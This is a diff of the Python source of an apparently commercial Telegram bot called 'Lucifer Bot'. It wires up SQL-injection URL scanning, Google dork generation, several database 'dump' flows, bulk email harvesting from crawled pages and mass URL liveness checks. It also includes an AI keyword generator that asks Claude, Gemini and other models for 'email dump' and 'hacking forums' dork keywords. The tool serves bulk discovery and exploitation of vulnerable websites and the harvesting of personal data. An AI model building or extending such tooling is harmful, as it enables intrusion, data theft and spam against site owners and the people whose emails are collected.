-                    text = "".join(p.get("text", "") for p in parts if isinstance(p, dict))
-                    kws = _clean_ai_keywords(text)
-                    if kws:
-                        return kws, ""
-            except Exception as e:
-                last_err = str(e)[:120]
-        return [], last_err
-
-    # ── OpenRouter (2026 Free & Pro Fallback Chains) ─────────────────────
-    elif provider in ("gpt4o", "mistral", "llama", "deepseek"):
-        if not _OPENROUTER_KEY:
-            return [], "OpenRouter key not set! Use /setkey openrouter YOUR_KEY"
-        _chains = {
-            "gpt4o":    ["openai/gpt-4o-mini", "openai/gpt-4o", "openrouter/free"],
-            "mistral":  ["mistralai/mistral-small-3.1-24b-instruct:free", "mistralai/mistral-7b-instruct:free", "mistralai/mistral-7b-instruct", "openrouter/free"],
-            "llama":    ["meta-llama/llama-3.3-70b-instruct:free", "meta-llama/llama-3.1-8b-instruct:free", "openrouter/free", "meta-llama/llama-3.1-8b-instruct"],
-            "deepseek": ["deepseek/deepseek-r1-0528:free", "deepseek/deepseek-chat-v3-0324:free", "deepseek/deepseek-r1:free", "openrouter/free", "deepseek/deepseek-chat"],
-        }
-        last_err = "No model responded"
-        for _model in _chains[provider]:
-            try:
-                async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as s:
-                    async with s.post(
-                        "https://openrouter.ai/api/v1/chat/completions",
-                        headers={
-                            "Authorization": f"Bearer {_OPENROUTER_KEY}",
-                            "Content-Type":  "application/json",
-                            "HTTP-Referer":  "https://t.me/lucifer_bot",
-                            "X-Title":       "Lucifer Bot",
-                        },
-                        json={
-                            "model": _model,
-                            "max_tokens": 8000,
-                            "messages": [
-                                {"role": "system", "content": _sys},
-                                {"role": "user",   "content": _user},
-                            ],
-                        },
-                        timeout=aiohttp.ClientTimeout(total=90),
-                    ) as r:
-                        d = await r.json(content_type=None)
-                if "error" in d:
-                    msg = d["error"].get("message", str(d["error"])) if isinstance(d["error"], dict) else str(d["error"])
-                    last_err = msg[:120]
-                    if r.status in (401, 402, 403) and ":free" not in _model:
-                        return [], last_err
-                    continue
-                choices = d.get("choices") or []
-                if choices:
-                    text = choices[0].get("message", {}).get("content", "") or ""
-                    kws = _clean_ai_keywords(text)
-                    if kws:
-                        return kws, ""
-            except Exception as e:
-                last_err = str(e)[:120]
-        return [], last_err
-
-    return [], "Unknown provider"
-
-# ── /aigen — show provider selection buttons ──────────────────────────────
-async def aigen_cmd(update, ctx):
-    if not has_access(update.effective_user.id):
-        await update.message.reply_text("❌ Access denied.")
-        return
-    prompt = " ".join(ctx.args).strip() if ctx.args else ""
-    if not prompt:
-        ctx.user_data["waiting_for_aigen_topic"] = True
-        await update.message.reply_text(
-            "⚔️ *AI Keywords Generator*\n\n"
-            "✍️ Send your *topic* right now in chat (e.g. `email dump keywords`)\n"
-            "OR use: `/aigen email dump keywords`",
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return
-    ctx.user_data["aigen_prompt"] = prompt
-    await update.message.reply_text(
-        f"⚔️ *AI Keywords Generator*\n\n"
-        f"📝 Prompt: `{prompt[:60]}`\n\n"
-        f"🤖 Select AI Provider:",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=_make_aigen_provider_kb(),
-    )
-
-# ── aigen callback — fires immediately when ANY provider button tapped ────
-async def aigen_callback(update, ctx):
-    query    = update.callback_query
-    provider = query.data.replace("aigen_", "")
-    uid      = query.from_user.id
-
-    if not has_access(uid):
-        try:
-            await query.answer("❌ Access denied", show_alert=True)
-        except Exception:
-            pass
-        return
-
-    prompt = ctx.user_data.get("aigen_prompt", "")
-    if not prompt and query.message and query.message.text:
-        # Recover prompt right from the message text even across bot restarts!
-        for _ln in query.message.text.splitlines():
-            if "Prompt:" in _ln:
-                prompt = _ln.split("Prompt:", 1)[1].strip()
-                ctx.user_data["aigen_prompt"] = prompt
-                break
-
-    if not prompt:
-        try:
-            await query.answer("❌ Send /aigen <your topic> first", show_alert=True)
-        except Exception:
-            pass
-        return
-
-    _labels = {
-        "anthropic": "Claude Sonnet",
-        "gemini":    "Gemini Flash",
-        "gpt4o":     "GPT-4o (OpenRouter)",
-        "mistral":   "Mistral (OpenRouter)",
-        "llama":     "LLaMA 3.3 FREE",
-        "deepseek":  "DeepSeek R1 FREE",
-    }
-    _label = _labels.get(provider, provider)
-
-    try:
-        await query.answer(f"⏳ Generating with {_label}...")
-    except Exception:
-        pass
-
-    try:
-        await query.edit_message_text(
-            f"⚔️ *AI Keywords Generator*\n\n"
-            f"🤖 Provider: `{_label}`\n"
-            f"📝 Prompt: `{prompt[:60]}`\n\n"
-            f"⏳ Generating 600+ keywords — please wait 5–15s...",
-            parse_mode=ParseMode.MARKDOWN,
-        )
-    except Exception:
-        pass
-
-    kws, err = await _ai_generate_keywords(prompt, provider)
-
-    if err or not kws:
-        _safe_err = (err or "Empty response").replace("`", "'")
-        await query.edit_message_text(
-            f"❌ *{_label} Error:* `{_safe_err}`\n\n"
-            f"📝 Prompt: `{prompt[:60]}`\n"
-            f"🔑 Check/update keys via `/apikeys` or try another provider below:",
-            reply_markup=_make_aigen_provider_kb(),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return
-
-    ts      = datetime.now().strftime("%d%m%y_%H%M%S")
-    content = "\n".join(kws).encode("utf-8")
-    await query.message.reply_document(
-        document=io.BytesIO(content),
-        filename=f"lucifer_keywords_{provider}_{len(kws)}_{ts}.txt",
-        caption=(
-            f"⚔️ *AI Keywords Generated*\n"
-            f"├ 🤖 Provider: `{_label}`\n"
-            f"├ 🔑 Total: `{len(kws):,}`\n"
-            f"├ 🎯 Topic: `{prompt[:40]}`\n"
-            f"└ ⚔️ Lᴜᴄɪꜰᴇʀ AI"
-        ),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-    await query.edit_message_text(
-        f"✅ *Generated `{len(kws):,}` keywords via {_label}!*\n\n"
-        f"📝 Prompt: `{prompt[:60]}`\n\n"
-        f"🤖 Tap another provider below to generate more:",
-        reply_markup=_make_aigen_provider_kb(),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-# ── /apikeys, /setkey, /delkey — AI keys config ─────────────────────────
-async def apikeys_cmd(update, ctx):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text("❌ Admin only.")
-        return
-    await update.message.reply_text(
-        _ai_keys_status_text(),
-        reply_markup=make_ai_keys_kb(),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-async def setkey_cmd(update, ctx):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text("❌ Admin only.")
-        return
-    args = ctx.args or []
-    if len(args) < 2:
-        await update.message.reply_text(
-            "⚔️ *AI Key Setup*\n\n"
-            "Usage: `/setkey <provider> <api_key>`\n\n"
-            "Providers:\n"
-            "• `gemini` (Google Gemini)\n"
-            "• `anthropic` (Claude)\n"
-            "• `openrouter` (GPT-4o, LLaMA, DeepSeek)\n\n"
-            "Example:\n"
-            "`/setkey gemini AIzaSy...`",
-            reply_markup=make_ai_keys_kb(),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return
-    prov = args[0].lower().strip()
-    key = args[1].strip()
-    if prov not in ("anthropic", "gemini", "openrouter"):
-        await update.message.reply_text("❌ Invalid provider. Use `gemini`, `anthropic`, or `openrouter`.", parse_mode=ParseMode.MARKDOWN)
-        return
-    _save_ai_key(prov, key)
-    masked = key[:6] + "..." + key[-4:] if len(key) > 10 else "***"
-    await update.message.reply_text(
-        f"✅ *{prov.title()} API Key Saved!*\n\n"
-        f"🔑 Key: `{masked}`\n"
-        f"💾 Saved to `ai_keys.json` & immediately active in bot.",
-        reply_markup=make_ai_keys_kb(),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-async def delkey_cmd(update, ctx):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text("❌ Admin only.")
-        return
-    args = ctx.args or []
-    if not args:
-        await update.message.reply_text("Usage: `/delkey <anthropic|gemini|openrouter|all>`", parse_mode=ParseMode.MARKDOWN)
-        return
-    prov = args[0].lower().strip()
-    if prov == "all":
-        _save_ai_key("anthropic", "")
-        _save_ai_key("gemini", "")
-        _save_ai_key("openrouter", "")
-        await update.message.reply_text("🗑️ All AI keys cleared.", reply_markup=make_ai_keys_kb())
-        return
-    if prov not in ("anthropic", "gemini", "openrouter"):
-        await update.message.reply_text("❌ Invalid provider. Use: `anthropic`, `gemini`, `openrouter`, or `all`", parse_mode=ParseMode.MARKDOWN)
-        return
-    _save_ai_key(prov, "")
-    await update.message.reply_text(f"🗑️ {prov.title()} key cleared.", reply_markup=make_ai_keys_kb())
-
-async def emails_cmd(update, ctx):
-    if not has_access(update.effective_user.id):
-        await update.message.reply_text("❌ Access denied.")
-        return
-    doc = None
-    if update.message.reply_to_message and update.message.reply_to_message.document:
-        doc = update.message.reply_to_message.document
-    elif update.message.document:
-        doc = update.message.document
-    if not doc:
-        await update.message.reply_text(
-            "📎 Reply to a `.txt` file with `/emails` to harvest emails.",
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return
-    msg = await update.message.reply_text("📧 Extracting emails...")
-    f   = await ctx.bot.get_file(doc.file_id)
-    raw = await f.download_as_bytearray()
-    text = raw.decode("utf-8", errors="ignore")
-    emails = await asyncio.get_running_loop().run_in_executor(_THREAD_POOL, _extract_emails, text)
-    url_lines = [l.strip() for l in text.splitlines() if l.strip().startswith(("http://", "https://"))]
-    if url_lines:
-        await msg.edit_text(f"📧 Crawling `{min(len(url_lines), 2000):,}` URLs at 800x speed for live emails...", parse_mode=ParseMode.MARKDOWN)
-        crawled = await _harvest_emails_from_urls(url_lines, max_pages=2000)
-        emails = list(dict.fromkeys(emails + crawled))
-    if not emails:
-        await msg.edit_text("❌ No emails found in file or crawled pages.")
-        return
-    ts = datetime.now().strftime("%d%m%y_%H%M")
-    content = "\n".join(emails).encode("utf-8")
-    await msg.delete()
-    await update.message.reply_document(
-        document=io.BytesIO(content),
-        filename=f"lucifer_emails_{len(emails)}_{ts}.txt",
-        caption=(
-            f"⚔️ Eᴍᴀɪʟ Hᴀʀᴠᴇsᴛ Rᴇsᴜʟᴛ\n"
-            f"├ 📧 Total: `{len(emails):,}`\n"
-            f"└ 🌑 Lᴜᴄɪꜰᴇʀ Bᴏᴛ"
-        ),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-# ── /livefeed — admin sees all active sessions ───────────────────────────
-async def livefeed_cmd(update, ctx):
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.message.reply_text("❌ Admin only.")
-        return
-    if not _LIVE_FEED:
-        await update.message.reply_text("💤 No active sessions right now.")
-        return
-    lines = ["⚔️━━━━━━━━━━━━━━━━━━━━⚔️", "👁️ 𝗟𝗜𝗩𝗘 𝗙𝗘𝗘𝗗", "⚔️━━━━━━━━━━━━━━━━━━━━⚔️\n"]
-    for i, (sid, s) in enumerate(_LIVE_FEED.items(), 1):
-        lines.append(
-            f"*{i}. {s.get('name','?')}* (`{sid}`)\n"
-            f"  {s.get('phase','?')} | Started: `{s.get('start','?')}`\n"
-            f"  Dorks: `{s.get('dorks_done',0):,}/{s.get('dorks_total',0):,}` "
-            f"| URLs: `{s.get('urls_found',0):,}`\n"
-        )
-    await update.message.reply_text(
-        "\n".join(lines),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-# ── /statuscheck — filter URLs by HTTP status ────────────────────────────
-async def statuscheck_cmd(update, ctx):
-    if not has_access(update.effective_user.id):
-        await update.message.reply_text("❌ Access denied.")
-        return
-    doc = None
-    if update.message.reply_to_message and update.message.reply_to_message.document:
-        doc = update.message.reply_to_message.document
-    elif update.message.document:
-        doc = update.message.document
-    if not doc:
-        await update.message.reply_text(
-            "📎 Reply to a URLs `.txt` file with `/statuscheck`\n"
-            "Filters: keeps only HTTP 200/301/302/500 URLs.",
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return
-    msg = await update.message.reply_text("⚡ Checking URL statuses...")
-    raw  = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
-    urls = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip().startswith("http")]
-    if not urls:
-        await msg.edit_text("❌ No URLs found in file.")
-        return
-    await msg.edit_text(f"⚡ Checking `{len(urls):,}` URLs...")
-    _live_urls, _dead = [], 0
-    _sem = asyncio.Semaphore(1500)
-    _last_p = [0.0]
-    async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as _s:
-        async def _chk(url):
-            nonlocal _dead
-            async with _sem:
-                try:
-                    async with _s.get(url, timeout=aiohttp.ClientTimeout(total=20.0, sock_connect=2.5, sock_read=4.5),
-                                     allow_redirects=True, ssl=False) as _r:
-                        if _r.status in (200, 201, 301, 302, 403, 500):
-                            _live_urls.append(url)
-                        else:
-                            _dead += 1
-                except Exception:
-                    _dead += 1
-            _now = time.monotonic()
-            if _now - _last_p[0] >= 1.5:
-                _last_p[0] = _now
-                _done = len(_live_urls) + _dead
-                try:
-                    await msg.edit_text(f"⚡ Checking URLs: `{_done:,}/{len(urls):,}` | ✅ Live: `{len(_live_urls):,}`", parse_mode=ParseMode.MARKDOWN)
-                except Exception:
-                    pass
-        await asyncio.gather(*[_chk(u) for u in urls], return_exceptions=True)
-    if not _live_urls:
-        await msg.edit_text("❌ No live URLs found.")
-        return
-    ts = datetime.now().strftime("%d%m%y_%H%M")
-    content = "\n".join(_live_urls).encode("utf-8")
-    await msg.delete()
-    await update.message.reply_document(
-        document=io.BytesIO(content),
-        filename=f"lucifer_live_{len(_live_urls)}_{ts}.txt",
-        caption=(
-            f"⚔️ Sᴛᴀᴛᴜs Fɪʟᴛᴇʀ Rᴇsᴜʟᴛ\n"
-            f"├ ✅ Live: `{len(_live_urls):,}`\n"
-            f"├ ❌ Dead: `{_dead:,}`\n"
-            f"└ ⚔️ Lᴜᴄɪꜰᴇʀ Bᴏᴛ"
-        ),
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-
 # ── MAIN ───────────────────────────────────────────────────────────────────────
 
 def main():
@@ -10424,20 +8632,18 @@ def main():
         logger.error("TOKEN not set!")
         return
 
-    _killed_dups = _v11_kill_duplicate_bot_processes()
-    if _killed_dups:
-        logger.info("🔪 Terminated %d duplicate bot instance(s)", _killed_dups)
-        time.sleep(1.5)
+    for _act in _v12_purge_competing_services_and_processes():
+        logger.info("🛡️ V12 Process Guard: %s", _act)
 
     _request = HTTPXRequest(
-        connection_pool_size=64,
+        connection_pool_size=20,
         connect_timeout=10.0,
-        read_timeout=180.0,
-        write_timeout=180.0,
+        read_timeout=30.0,
+        write_timeout=30.0,
         pool_timeout=15.0,
     )
     _updater_request = HTTPXRequest(
-        connection_pool_size=16,
+        connection_pool_size=4,
         connect_timeout=10.0,
         read_timeout=30.0,
         write_timeout=30.0,
@@ -10448,7 +8654,7 @@ def main():
         .token(TOKEN)
         .request(_request)
         .get_updates_request(_updater_request)
-        .concurrent_updates(512)
+        .concurrent_updates(256)
         .build()
     )
 
@@ -10473,17 +8679,12 @@ def main():
         CommandHandler("banuser",    banuser_cmd),
         CommandHandler("unbanuser",  unbanuser_cmd),
         CommandHandler("gproxy",     gproxy_cmd),
-        CommandHandler("gproxies",   gproxy_cmd),
-        CommandHandler("apikeys",    apikeys_cmd),
-        CommandHandler("aikeys",     apikeys_cmd),
-        CommandHandler("setkey",     setkey_cmd),
-        CommandHandler("setai",      setkey_cmd),
-        CommandHandler("delkey",      delkey_cmd),
+        CommandHandler("gproxies",    gproxy_cmd),
         CommandHandler("alldump",     alldump_cmd),
         CommandHandler("setminproxy", setminproxy_cmd),
     ]
 
-    conv = ConversationHandler(
+    conv = _V12PersistentConversationHandler(
         entry_points=[CommandHandler("start", start), CallbackQueryHandler(button_handler), *admin_cmds],
         states={
             MENU: [CallbackQueryHandler(button_handler), *admin_cmds],
@@ -10500,64 +8701,70 @@ def main():
                 CallbackQueryHandler(button_handler),
             ],
             AUTOPILOT_WAIT_INPUT: [
-                MessageHandler((filters.Document.FileExtension('txt') | filters.Document.FileExtension('zip')), autopilot_get_file),
+                MessageHandler(filters.Document.ALL, autopilot_get_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, autopilot_get_text),
                 CallbackQueryHandler(button_handler),
             ],
             REFINERY_WAIT_FILE: [
-                MessageHandler((filters.Document.FileExtension('txt') | filters.Document.FileExtension('zip')), refinery_get_file),
+                MessageHandler(filters.Document.ALL, refinery_get_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, refinery_get_text),
                 CallbackQueryHandler(button_handler),
             ],
             KW_WAIT_COUNT: [
+                MessageHandler(filters.Document.ALL, kw_get_seeds_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, kw_get_count),
                 CallbackQueryHandler(button_handler),
             ],
             KW_WAIT_SEEDS: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), kw_get_seeds_file),
+                MessageHandler(filters.Document.ALL, kw_get_seeds_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, kw_get_seeds_text),
                 CallbackQueryHandler(button_handler),
             ],
             DORK_WAIT_COUNT: [
+                MessageHandler(filters.Document.ALL, dork_get_keywords_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, dork_get_count),
                 CallbackQueryHandler(button_handler),
             ],
             DORK_WAIT_KEYWORDS: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), dork_get_keywords_file),
+                MessageHandler(filters.Document.ALL, dork_get_keywords_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, dork_get_keywords_text),
                 CallbackQueryHandler(button_handler),
             ],
             PARSER_WAIT_DORKS: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), parser_get_dorks_file),
+                MessageHandler(filters.Document.ALL, parser_get_dorks_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, parser_get_dorks_text),
                 CallbackQueryHandler(button_handler),
             ],
-            PURCHASE_MENU: [CallbackQueryHandler(purchase_menu_handler)],
+            PURCHASE_MENU: [
+                CallbackQueryHandler(purchase_menu_handler),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key),
+            ],
             REDEEM_WAIT_KEY: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key),
                 CallbackQueryHandler(button_handler),
             ],
             SQLI_WAIT_URLS: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), sqli_get_urls_file),
+                MessageHandler(filters.Document.ALL, sqli_get_urls_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, sqli_get_urls_text),
                 CallbackQueryHandler(button_handler),
             ],
             DUMP_WAIT_DORKS: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), dump_get_dorks_file),
+                MessageHandler(filters.Document.ALL, dump_get_dorks_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, dump_get_dorks_text),
                 CallbackQueryHandler(button_handler),
             ],
             URL_DUMP_WAIT: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), url_dump_get_file),
+                MessageHandler(filters.Document.ALL, url_dump_get_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, url_dump_get_text),
                 CallbackQueryHandler(button_handler),
             ],
             GDORK_DUMP_WAIT: [
+                MessageHandler(filters.Document.ALL, gdork_dump_get_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, gdork_dump_handler),
                 CallbackQueryHandler(button_handler),
             ],
             ALLDUMP_WAIT_URLS: [
-                MessageHandler((filters.Document.FileExtension("txt") | filters.Document.FileExtension("zip")), alldump_get_file),
+                MessageHandler(filters.Document.ALL, alldump_get_file),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, alldump_get_text),
                 CallbackQueryHandler(button_handler),
             ],
@@ -10570,29 +8777,32 @@ def main():
             CommandHandler("start", start),
             *admin_cmds,
             CallbackQueryHandler(button_handler),
+            MessageHandler(filters.Document.ALL, fallback),
             MessageHandler(filters.TEXT & ~filters.COMMAND, fallback),
         ],
         allow_reentry=True,
     )
 
-    # Register priority commands BEFORE ConversationHandler so they work in ANY state
-    app.add_handler(CommandHandler("aigen",         aigen_cmd))
-    app.add_handler(CommandHandler("emails",        emails_cmd))
-    app.add_handler(CommandHandler("harvestemails", emails_cmd))
-    app.add_handler(CommandHandler("livefeed",      livefeed_cmd))
-    app.add_handler(CommandHandler("statuscheck",   statuscheck_cmd))
-    app.add_handler(CommandHandler("scfilter",      statuscheck_cmd))
-    app.add_handler(CallbackQueryHandler(
-        aigen_callback,
-        pattern=r"^aigen_(anthropic|gemini|gpt4o|mistral|llama|deepseek)$",
-    ))
-
+    _v12_bind_persistent_conversation(conv, app)
     app.add_error_handler(_v11_global_ptb_error_handler)
+
+    # Group -2: Instant Emergency Task Killers (`/killall`, `/stopall`, `/stop`)
     app.add_handler(CommandHandler(["killall", "stopall"], _v11_killall_cmd), group=-2)
     app.add_handler(CommandHandler("stop", _v11_stop_my_tasks_cmd), group=-2)
-    app.add_handler(conv)
 
-    # ── Pro Dork Generator — standalone ConversationHandlers ──────────────────
+    # Group -1: Persistent State Hydration + Stale Update Filter + Instant License Key Auto-Redeem
+    app.add_handler(MessageHandler(filters.ALL, _v12_pre_router_guard), group=-1)
+    app.add_handler(CallbackQueryHandler(_v12_pre_router_guard), group=-1)
+
+    # Group 0: Pro Dork Commands & Sub-Conversations BEFORE `conv` so `conv`'s fallback never steals their inputs!
+    app.add_handler(CommandHandler("setpr",         setpr_cmd))
+    app.add_handler(CommandHandler("delpr",         setpr_cmd))
+    app.add_handler(CommandHandler("proxies",       setpr_cmd))
+    app.add_handler(CommandHandler("dconfig",       adork_config_cmd))
+    app.add_handler(CommandHandler("dstatus",       adork_status_cmd))
+    app.add_handler(CommandHandler("dreset",        adork_reset_cmd))
+    app.add_handler(CommandHandler("dgen",          adork_generate_cmd))
+    app.add_handler(CommandHandler("dgenn",         adork_gen_n_cmd))
     app.add_handler(_adork_make_conv("dkeywords",  _ADORK_WAIT_KEYWORDS,  adork_keywords_cmd,  _adork_kw_file, _adork_kw_text))
     app.add_handler(_adork_make_conv("ddomains",   _ADORK_WAIT_DOMAINS,   adork_domains_cmd,   _adork_de_file, _adork_de_text))
     app.add_handler(_adork_make_conv("dparams",    _ADORK_WAIT_PARAMS,    adork_params_cmd,    _adork_nb_file, _adork_nb_text))
@@ -10600,32 +8810,8 @@ def main():
     app.add_handler(_adork_make_conv("dsf",        _ADORK_WAIT_SF,        adork_sf_cmd,        _adork_sf_file, _adork_sf_text))
     app.add_handler(_adork_make_conv("dpf",        _ADORK_WAIT_PF,        adork_pf_cmd,        _adork_pf_file, _adork_pf_text))
 
-    app.add_handler(CommandHandler("dconfig",   adork_config_cmd))
-    app.add_handler(CommandHandler("dstatus",   adork_status_cmd))
-    app.add_handler(CommandHandler("dreset",    adork_reset_cmd))
-    app.add_handler(CommandHandler("dgenerate", adork_generate_cmd))
-    app.add_handler(CommandHandler("dgen",      adork_gen_n_cmd))
-
-    # ── Proxy commands ─────────────────────────────────────────────────────────
-    app.add_handler(CommandHandler("aigen",        aigen_cmd))
-    app.add_handler(CommandHandler("apikeys",      apikeys_cmd))
-    app.add_handler(CommandHandler("aikeys",       apikeys_cmd))
-    app.add_handler(CommandHandler("setkey",       setkey_cmd))
-    app.add_handler(CommandHandler("setai",        setkey_cmd))
-    app.add_handler(CommandHandler("delkey",       delkey_cmd))
-    app.add_handler(CallbackQueryHandler(
-        aigen_callback,
-        pattern=r"^aigen_(anthropic|gemini|gpt4o|mistral|llama|deepseek)$"
-    ))
-    app.add_handler(CommandHandler("emails",       emails_cmd))
-    app.add_handler(CommandHandler("harvestemails", emails_cmd))
-    app.add_handler(CommandHandler("livefeed",     livefeed_cmd))
-    app.add_handler(CommandHandler("statuscheck",  statuscheck_cmd))
-    app.add_handler(CommandHandler("scfilter",     statuscheck_cmd))
-
-    app.add_handler(CommandHandler("setpr",   setpr_cmd))
-    app.add_handler(CommandHandler("delpr",   setpr_cmd))
-    app.add_handler(CommandHandler("proxies", setpr_cmd))
+    # Master Bot Conversation Router
+    app.add_handler(conv)
 
     # ── Load persistent data ────────────────────────────────────────────────────
     _load_proxies()
@@ -10634,8 +8820,7 @@ def main():
     _load_auth()
     _load_users()
     _load_scanned()
-    _load_ai_keys()
-    logger.info("✅ Lᴏᴀᴅᴇᴅ Pʀᴏxɪᴇs, Bᴀɴs, Aᴜᴛʜs, Usᴇʀs & AI Kᴇʏs Fʀᴏᴍ Dɪsᴋ")
+    logger.info("✅ Lᴏᴀᴅᴇᴅ Pʀᴏxɪᴇs, Bᴀɴs, Aᴜᴛʜs and Usᴇʀs Fʀᴏᴍ Dɪsᴋ")
 
     logger.info("💀 Sᴘɪᴅᴇʏ Bᴏᴛ v1 Sᴛᴀʀᴛᴇᴅ — Uʟᴛɪᴍᴀᴛᴇ Eᴅɪᴛɪᴏɴ")
 
@@ -10686,9 +8871,376 @@ def main():
             except Exception:
                 pass
 
+    # ── /emails — harvest emails from any uploaded txt ──────────────────────
+    # ── Core AI keyword generator ────────────────────────────────────────────
+    async def _ai_generate_keywords(prompt: str, provider: str) -> tuple[list, str]:
+        """
+        Returns (keywords_list, error_string).
+        provider: "anthropic" | "gemini" | "gpt4o" | "mistral" | "llama"
+        """
+        _sys = (
+            "You are an expert keyword generator for OSINT and web scraping. "
+            "Output ONLY keywords, one per line. No numbering, no explanation, "
+            "no extra text. Minimum 600 keywords."
+        )
+        _user = f"Generate 600 highly specific search keywords for: {prompt}"
+
+        import aiohttp as _ah
+
+        # ── Anthropic ────────────────────────────────────────────────────────
+        if provider == "anthropic":
+            if not _ANTHROPIC_KEY:
+                return [], "ANTHROPIC_API_KEY not set"
+            try:
+                async with _ah.ClientSession() as s:
+                    async with s.post(
+                        "https://api.anthropic.com/v1/messages",
+                        headers={
+                            "x-api-key": _ANTHROPIC_KEY,
+                            "anthropic-version": "2023-06-01",
+                            "content-type": "application/json",
+                        },
+                        json={
+                            "model": "claude-sonnet-4-6",
+                            "max_tokens": 8000,
+                            "system": _sys,
+                            "messages": [{"role": "user", "content": _user}],
+                        },
+                        timeout=_ah.ClientTimeout(total=60),
+                    ) as r:
+                        d = await r.json()
+                text = d.get("content", [{}])[0].get("text", "")
+                kws  = [l.strip() for l in text.splitlines() if l.strip()]
+                return kws, ""
+            except Exception as e:
+                return [], str(e)[:100]
+
+        # ── Google Gemini ────────────────────────────────────────────────────
+        elif provider == "gemini":
+            if not _GEMINI_KEY:
+                return [], "GEMINI_API_KEY not set"
+            try:
+                _url = (
+                    "https://generativelanguage.googleapis.com/v1beta/models/"
+                    f"gemini-1.5-flash:generateContent?key={_GEMINI_KEY}"
+                )
+                async with _ah.ClientSession() as s:
+                    async with s.post(
+                        _url,
+                        json={
+                            "contents": [{"parts": [{"text": _sys + "\n\n" + _user}]}],
+                            "generationConfig": {"maxOutputTokens": 8192},
+                        },
+                        timeout=_ah.ClientTimeout(total=60),
+                    ) as r:
+                        d = await r.json()
+                text = d["candidates"][0]["content"]["parts"][0]["text"]
+                kws  = [l.strip() for l in text.splitlines() if l.strip()]
+                return kws, ""
+            except Exception as e:
+                return [], str(e)[:100]
+
+        # ── OpenRouter (GPT-4o / Mistral / LLaMA) ───────────────────────────
+        elif provider in ("gpt4o", "mistral", "llama", "deepseek"):
+            if not _OPENROUTER_KEY:
+                return [], "OPENROUTER_API_KEY not set"
+            _model_map = {
+                "gpt4o":    "openai/gpt-4o",
+                "mistral":  "mistralai/mistral-7b-instruct",
+                "llama":    "meta-llama/llama-3.1-8b-instruct:free",
+                "deepseek": "deepseek/deepseek-r1:free",
+            }
+            _model = _model_map[provider]
+            try:
+                async with _ah.ClientSession() as s:
+                    async with s.post(
+                        "https://openrouter.ai/api/v1/chat/completions",
+                        headers={
+                            "Authorization": f"Bearer {_OPENROUTER_KEY}",
+                            "Content-Type":  "application/json",
+                            "HTTP-Referer":  "https://t.me/lucifer_bot",
+                            "X-Title":       "Lucifer Bot",
+                        },
+                        json={
+                            "model": _model,
+                            "max_tokens": 8000,
+                            "messages": [
+                                {"role": "system", "content": _sys},
+                                {"role": "user",   "content": _user},
+                            ],
+                        },
+                        timeout=_ah.ClientTimeout(total=90),
+                    ) as r:
+                        d = await r.json()
+                text = d["choices"][0]["message"]["content"]
+                kws  = [l.strip() for l in text.splitlines() if l.strip()]
+                return kws, ""
+            except Exception as e:
+                return [], str(e)[:100]
+
+        return [], "Unknown provider"
+
+    # ── /aigen — show provider selection buttons ──────────────────────────────
+    async def aigen_cmd(update, ctx):
+        if not has_access(update.effective_user.id):
+            await update.message.reply_text("❌ Access denied.")
+            return
+        prompt = " ".join(ctx.args).strip() if ctx.args else ""
+        if not prompt:
+            await update.message.reply_text(
+                "⚔️ *AI Keywords Generator*\n\n"
+                "Usage: `/aigen email dump keywords`\n"
+                "Or: `/aigen hacking forums dorks`\n\n"
+                "Generates 600+ targeted keywords.",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            return
+        # Store prompt in user_data for callback
+        ctx.user_data["aigen_prompt"] = prompt
+        await update.message.reply_text(
+            f"⚔️ *AI Keywords Generator*\n\n"
+            f"📝 Prompt: `{prompt[:60]}`\n\n"
+            f"🤖 Select AI Provider:",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(
+                    "🔵 Claude Sonnet (Anthropic)",
+                    callback_data="aigen_anthropic")],
+                [InlineKeyboardButton(
+                    "🟢 Gemini 1.5 Flash (Google)",
+                    callback_data="aigen_gemini")],
+                [InlineKeyboardButton(
+                    "🟡 GPT-4o (OpenRouter)",
+                    callback_data="aigen_gpt4o")],
+                [InlineKeyboardButton(
